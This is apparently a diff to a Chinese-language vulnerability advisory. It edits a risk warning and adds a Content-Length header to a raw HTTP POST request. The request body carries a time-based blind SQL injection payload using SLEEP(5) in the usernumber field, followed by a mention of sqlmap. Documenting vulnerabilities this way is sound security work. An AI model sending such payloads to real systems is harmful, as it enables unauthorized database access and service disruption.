@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -69,11 +69,12 @@ Connection: close
 Cookie: PHPSESSID=4c1e6025b94bac25c4ec63e4affec7cd; authcode=3hqs
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
 
 sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1' AND (SELECT 5464 FROM (SELECT(SLEEP(5)))FZxX) AND 'khLM'='khLM
 ```
 
-> 请求长度说明：原资料 Content-Length 为 74；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 74；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 sqlmap
